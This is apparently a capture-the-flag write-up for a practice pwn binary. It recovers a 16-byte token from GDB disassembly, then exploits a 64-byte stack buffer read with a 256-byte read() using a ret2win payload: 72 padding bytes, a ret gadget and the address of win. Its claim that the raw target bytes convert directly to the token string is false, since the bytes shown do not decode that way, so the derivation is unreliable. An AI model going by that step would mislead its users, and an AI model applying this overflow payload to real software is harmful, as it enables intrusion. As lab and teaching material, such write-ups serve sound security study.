# Barbieland Buffer Blowout

## Description

A glamorous Barbieland relay kiosk still accepts calibration input before unlocking its backstage tools. Work the console correctly and recover the final pink protocol message.

## Solution Walkthrough

1. **Step 1**:

   First, figure out how to get the token. After disassembling `main` in GDB, I found `check_token`, and the token length is 16 bytes:

   ```text
   0x00000000004012f3 <+24>:    call   0x401130 <strlen@plt>
   0x00000000004012f8 <+29>:    cmp    $0x10,%rax
   ```

   I also found the `target`, which is the token:

   ```text
   0x000000000040137b <+160>:   cltq
   0x000000000040137d <+162>:   lea    0xdcc(%rip),%rdx        # 0x402150 <target.0>
   0x0000000000401384 <+169>:   movzbl (%rax,%rdx,1),%eax
   0x0000000000401388 <+173>:   cmp    %al,-0x19(%rbp)
   ```

   The `target` looks like this:

   ```text
   0x402150 <target.0>:    0x5a    0x06    0xb5    0x86    0x17    0x08    0x8e 0xba
   0x402158 <target.0+8>:  0xd6    0xd4    0xd7    0x06    0xb7    0x96    0x38 0xae
   ```

   After converting from hex to bytes, it becomes:

   ```text
   B4RB13-C0R3GL4M!
   ```

   This is the token.

2. **Step 2**:

   Observing `vulnerable_prompt`, we can see that:

   ```text
   0x0000000000401525 <+8>:     sub    $0x40,%rsp
   ...
   0x0000000000401560 <+67>:    lea    -0x40(%rbp),%rax
   0x0000000000401564 <+71>:    mov    $0x100,%edx
   0x0000000000401569 <+76>:    mov    %rax,%rsi
   0x000000000040156c <+79>:    mov    $0x0,%edi
   0x0000000000401571 <+84>:    call   0x401160 <read@plt>
   ```

   The buffer is only 64 bytes, but `read()` can read up to 256 bytes, so an overflow is possible.

   To overflow the buffer and the saved RBP, we need `64 + 8 = 72` bytes, so we fill the beginning with 72 `A`s.

   Additionally, there is no PIE in this challenge, so we can perform a ret2win directly. Scanning the functions in GDB reveals a `win` function at `0x4013c3`; jumping there will allow us to obtain the flag.

   The payload is:

   ```python
   b"A" * 72 + p64(0x40101a) + p64(0x4013c3)
   ```

   Where `0x40101a` is `ret` and `0x4013c3` is `win`.

## Flag

```text
bitctf{{b4rb13_buff3r_b10w0u7}}
```
